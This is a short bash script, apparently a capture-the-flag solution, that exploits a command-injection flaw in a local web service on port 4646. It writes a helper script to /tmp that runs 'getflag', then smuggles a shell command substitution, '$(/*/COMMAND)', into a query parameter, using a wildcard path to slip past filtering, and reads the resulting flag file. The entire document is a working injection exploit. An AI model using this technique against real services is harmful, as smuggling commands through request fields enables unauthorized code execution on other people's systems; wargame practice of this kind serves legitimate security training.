#!/bin/bash

touch /tmp/COMMAND
touch /tmp/flag

echo "#!/bin/bash" > /tmp/COMMAND
echo "getflag > /tmp/flag" >> /tmp/COMMAND

chmod a+x /tmp/COMMAND

curl '127.0.0.1:4646?x=$(/*/COMMAND)&y=void'
cat /tmp/flag